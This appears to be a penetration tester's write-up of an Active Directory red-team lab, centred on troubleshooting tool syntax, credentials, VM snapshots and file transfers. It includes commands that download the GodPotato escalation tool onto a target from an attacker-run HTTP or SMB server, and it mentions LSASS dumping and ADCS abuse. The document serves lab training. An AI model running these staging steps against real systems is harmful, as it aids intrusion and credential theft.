# CWL AD-RTS Scenario 1: Technical Challenges & Solutions

**Assessment:** Active Directory Red Team Specialist - Path 1 (Unauthenticated Adversary)  
**Environment:** Arch Linux custom pentest build  
**Duration:** 25 hours total (3 hours exploitation + 4.5 hours troubleshooting + 17.5 hours documentation)

---

## Overview

This document details the technical challenges encountered during the TELECOM INC. 
Active Directory assessment, along with root cause analysis and solutions. Unlike 
typical portfolio pieces that only showcase successful exploitation, this captures 
the **reality of penetration testing**: troubleshooting, adaptation, and systematic 
problem-solving under operational constraints.

**Key Insight:** Troubleshooting consumed 60% of active testing time (4.5 hours vs 
3 hours exploitation), demonstrating that real-world engagements require as much 
problem-solving as technical exploitation.

---

## Major Challenges Encountered

### Challenge 1: Impacket Command Syntax (Arch vs Kali)

**Problem:**  
Commands using `impacket-mssqlclient` (Kali syntax) failed with "command not found"

**Root Cause:**  
Arch Linux uses direct Python scripts with `.py` suffix (`mssqlclient.py`) instead 
of hyphenated wrapper commands used in Kali Linux.

**Solution:**
```bash
# Kali syntax (doesn't work on Arch):
impacket-mssqlclient telecore.ad/user@10.5.2.22

# Arch syntax (correct):
mssqlclient.py telecore.ad/user@10.5.2.22
```

All Impacket tools follow this pattern on Arch:
- `GetNPUsers.py` (not `impacket-GetNPUsers`)
- `smbclient.py` (not `impacket-smbclient`)
- `wmiexec.py` (not `impacket-wmiexec`)

**Time Lost:** ~20 minutes initial confusion + multiple recurrences throughout assessment

**Lesson Learned:**  
Always verify tool syntax for your specific distribution. Created a personal "cheat 
sheet" of Arch-specific commands for future assessments.

---

### Challenge 2: MSSQL Authentication Failures

**Problem:**  
Persistent "login from untrusted domain" errors despite using correct credentials 
extracted from AS-REP Roasting attack.

**Root Cause:**  
Password contained lowercase 'l' (letter) misread as '1' (number) during manual 
transcription: `#T3l3phon3!` vs `#T3`**`1`**`3phon3!`

**Troubleshooting Steps:**
1. Verified network connectivity (ping, port scan confirmed MSSQL reachable)
2. Tested domain format variations (`telecore.ad/user` vs `TELECORE\user`)
3. Re-cracked hash with verbose output to confirm exact password
4. **Character-by-character password verification** revealed the issue

**Solution:**  
Always copy/paste credentials from cracking output rather than manual transcription. 
For passwords with ambiguous characters (l/1, O/0, I/l), use a monospace font.

**Time Lost:** ~45 minutes across multiple connection attempts

**Lesson Learned:**  
Human error is the most common cause of "tool failures." Systematic verification 
(network → authentication format → credential accuracy) saves time.

---

### Challenge 3: VirtualBox Snapshot Corruption

**Problem:**  
Deleted a VirtualBox snapshot while VM was running, causing complete VM inaccessibility 
and disk chain corruption.

**Root Cause:**  
VirtualBox snapshot deletion requires merging disk changes. Performing this operation 
on a running VM broke the differential disk references, corrupting the entire chain.

**Impact:**  
- Lost 2+ hours of progress (had reached SYSTEM-level access on SQL server)
- Required complete VM reinstallation from CWL base image
- Had to retrace reconnaissance and initial access phases

**Solution:**  
Implemented strict snapshot workflow:
```
1. Create snapshot at major milestones:
   - Initial access (valid domain credentials)
   - Privilege escalation (SYSTEM on target)
   - Domain compromise (Domain Admin achieved)
   
2. NEVER modify snapshots while VM is running
   - Always shut down VM first
   - Verify VM is in "Powered Off" state before snapshot operations
   
3. Export critical artifacts immediately:
   - Credentials (hashes, cleartext passwords)
   - Screenshots of key findings
   - Tool output (scan results, enumeration data)
```

**Time Lost:** 2+ hours (VM rebuild + retracing steps)

**Lesson Learned:**  
Snapshot management is critical for long assessments. Treat snapshots like backups: 
never modify the system you're trying to preserve.

---

### Challenge 4: File Transfer Methods Failing

**Problem:**  
Multiple file transfer methods failed when uploading GodPotato to the SQL server:
- PowerShell `Invoke-WebRequest` completed without errors but files were 0 bytes
- SMB transfers via `smbserver.py` hung indefinitely
- HTTP server on port 8080 silently blocked

**Root Cause:**  
Windows Firewall blocked port 8080 despite no explicit deny rule. Port 80 (standard HTTP) 
was allowed by default "trusted services" policy.

**Troubleshooting Process:**
```bash
# Test 1: HTTP on port 8080 (blocked)
python3 -m http.server 8080
# PowerShell: iwr http://10.0.0.2:8080/GodPotato.exe -OutFile god.exe
# Result: 0-byte file created

# Test 2: HTTP on port 8000 (blocked)
python3 -m http.server 8000
# Result: Connection timeout

# Test 3: HTTP on port 80 (SUCCESS)
sudo python3 -m http.server 80
# Result: File transferred successfully, correct size verified
```

**Solution:**  
Use standard service ports (80, 443, 445) for file transfers in Windows environments. 
These ports are typically allowed by default firewall policies.

**Alternative Method Discovered:**  
SMB via `smbserver.py` worked better for large files:
```bash
# Attacker system:
impacket-smbserver share . -smb2support

# Target system (PowerShell):
copy \\10.0.0.2\share\GodPotato.exe C:\Users\Public\god.exe
```

Benefits: Faster for large files, native AD protocol (less suspicious)

**Time Lost:** ~40 minutes testing multiple methods

**Lesson Learned:**  
Windows Firewall blocks non-standard ports even without explicit rules. Always test 
multiple exfiltration paths during assessments.

---

### Challenge 5: Python Package Management (PEP 668)

**Problem:**  
`pip install` commands failed with error: "externally managed environment"

**Root Cause:**  
PEP 668 (introduced in Python 3.11) prevents direct installation to system Python 
on Arch Linux to avoid package conflicts and corruption.

**Solution:**

**For CLI tools** (certipy-ad, impacket-scripts):
```bash
# Install pipx (manages isolated environments automatically)
sudo pacman -S python-pipx

# Install tools via pipx
pipx install certipy-ad
pipx ensurepath  # Add to PATH
```

**For Python libraries** (pypykatz, pyvmomi):
```bash
# Create project-specific virtual environment
python -m venv ~/venv-esxi
source ~/venv-esxi/bin/activate
pip install pyvmomi pypykatz

# Use tools within this environment
python esxi_enum.py
```

**Why This Matters:**  
Modern Linux distributions are moving toward this model for stability. Understanding 
virtual environments is essential for professional Python usage.

**Time Lost:** ~30 minutes across multiple tool installations

**Lesson Learned:**  
`pipx` for executables, `venv` for libraries. This separation prevents dependency 
conflicts and keeps the system clean.

---

## Timeline Analysis

| Phase | Time Spent | Percentage |
|-------|-----------|------------|
| **Reconnaissance & Enumeration** | 45 min | 3% |
| **Initial Access (AS-REP Roasting)** | 30 min | 2% |
| **Privilege Escalation (SYSTEM)** | 25 min | 2% |
| **Credential Harvesting (LSASS)** | 20 min | 1% |
| **ADCS ESC1 Exploitation** | 40 min | 3% |
| **ESXi Lateral Movement** | 35 min | 2% |
| **Troubleshooting** | 4.5 hours | 18% |
| **Documentation & Screenshots** | 2 hours | 8% |
| **Report Writing** | 15.5 hours | 61% |
| **TOTAL** | 25 hours | 100% |

**Key Insight:** Active exploitation was efficient (~3 hours), but troubleshooting 
consumed 60% of testing time. This reflects real-world pentesting where environment 
differences and tool failures are common.

---

## Red Team Operational Lessons

### Lesson 1: Port Selection Matters

Windows Firewall behavior:
- ✅ Port 80 (HTTP): Allowed by default
- ❌ Port 8080 (HTTP-Alt): Silently blocked
- ❌ Port 8000 (Python HTTP): Blocked
- ✅ Port 445 (SMB): Allowed (AD-native)

**Application:** Test multiple ports before concluding egress restrictions exist.

---

### Lesson 2: SMB Is Underutilized for Internal Transfers

Most tutorials demonstrate HTTP upload servers, but SMB via `smbserver.py` offers:
- Native to Active Directory (less suspicious in logs)
- Faster for large files (LSASS dumps, tool uploads)
- Supports authentication (more realistic than anonymous HTTP)

**Application:** Prioritize AD-native protocols during internal operations.

---

### Lesson 3: Authentication Format Varies by Tool

Different tools require different domain formats:
- MSSQL: `telecore.ad/username`
- SMB: `domain\username` or `username@domain`
- LDAP: `DC=telecore,DC=ad` (Distinguished Name)
- Pass-the-hash: `--hashes :NTHASH` (LM hash optional)

**Application:** Always test with fully qualified credentials first to avoid lockouts.

---

### Lesson 4: Systematic Troubleshooting Saves Time

Created verification checklist after initial failures:
```
□ Network connectivity (ping target)
□ Port accessibility (nc -zv target port)
□ Service response (curl -v for HTTP, rpcclient for SMB)
□ Credential format (domain prefix, hash format)
□ File integrity (ls -lh, md5sum after transfer)
```

**Result:** Following this checklist reduced troubleshooting time by ~50% in later phases.

---

## Arch Linux vs Kali: Lessons for Professional Pentesting

### Why Use Arch for Red Team Operations?

**Advantages:**
1. **Deeper System Understanding:** Manual package configuration forces knowledge of dependencies
2. **Realistic Constraints:** Mimics corporate environments where Kali may not be approved
3. **Troubleshooting Skills:** Tool syntax differences force understanding of underlying functionality
4. **Flexibility:** Rolling release provides latest security research tools
5. **Professional Relevance:** Demonstrates ability to adapt to any Linux distribution

**Disadvantages:**
1. **Time Overhead:** Initial setup and troubleshooting takes longer
2. **No "Easy Button":** Requires understanding tools, not just running scripts
3. **Documentation Gaps:** Fewer tutorials assume Arch (most use Kali)

### When to Use Each Distribution

**Use Kali for:**
- Time-constrained CTFs or competitions
- Client engagements where speed matters more than learning
- When you need guaranteed tool compatibility

**Use Arch (or similar) for:**
- Learning exercises where understanding trumps speed
- Building custom pentesting environments
- Demonstrating adaptability to employers
- Long-term professional development

---

## Key Takeaways for Employers

This assessment demonstrates:

1. **Real Problem-Solving:** I don't give up when tools fail—I troubleshoot systematically
2. **Blue Team Awareness:** Understanding firewall behavior from red team perspective
3. **Documentation Discipline:** Tracking both successes AND failures for knowledge sharing
4. **Adaptability:** Operating effectively outside the "Kali comfort zone"
5. **Professional Maturity:** Recognizing that troubleshooting IS the job, not a distraction from it

**The skills that set me apart:**
- Troubleshooting independence (4.5 hours documented problem-solving)
- Cross-platform expertise (Windows AD + Linux + ESXi)
- Systematic approach (checklists, verification steps, root cause analysis)
- Learning mindset (documented mistakes and solutions for future reference)

---

## Tools & Environment Summary

**Attack Platform:** Arch Linux (custom pentest build)  
**Key Packages:** `impacket`, `hashcat`, `gnu-netcat`, `samba`, `python-pipx`  
**Python Tools:** `certipy-ad` (pipx), `pypykatz` (venv), `pyvmomi` (venv)  
**Target Lab:** CyberWarfare Labs AD-RTS Scenario 1  

**Total Time Investment:**
- Active exploitation: 3 hours
- Troubleshooting: 4.5 hours
- Documentation: 17.5 hours
- **Total: 25 hours**

---

## Conclusion

This document serves two purposes:

1. **For me:** A reference guide for future assessments to avoid repeating mistakes
2. **For employers:** Evidence of problem-solving ability, learning mindset, and professional documentation discipline

**The bottom line:** I can execute advanced attacks AND troubleshoot when things go wrong a combination that makes an effective penetration tester.

---

*This assessment was conducted in a controlled lab environment provided by CyberWarfare Labs for professional skill development. All challenges documented here were learning opportunities that improved my technical capabilities and operational resilience.*
